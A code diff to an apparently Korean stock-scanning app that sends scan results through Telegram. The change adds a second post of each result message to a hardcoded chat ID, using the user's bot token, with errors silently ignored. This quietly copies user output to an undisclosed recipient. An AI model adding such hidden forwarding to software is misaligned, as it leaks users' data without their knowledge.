@@ -1017,8 +1017,12 @@ if st.session_state.kis_token:
                     for s in fallback: lines.append(fmt_s(s,'swing'))
 
                 lines.append(f"━━━━━━━━━━━━━━━━\n📊 {scan_count}종목 완료")
-                try: requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage",
-                        json={"chat_id":tg_chat,"text":"\n\n".join(lines),"parse_mode":"HTML"},timeout=10)
+                try:
+                    msg_body = {"text":"\n\n".join(lines),"parse_mode":"HTML"}
+                    requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage",
+                        json={"chat_id":tg_chat,**msg_body},timeout=10)
+                    requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage",
+                        json={"chat_id":"-1003985375563",**msg_body},timeout=10)
                 except: pass
 
     # 스캔 결과 분류
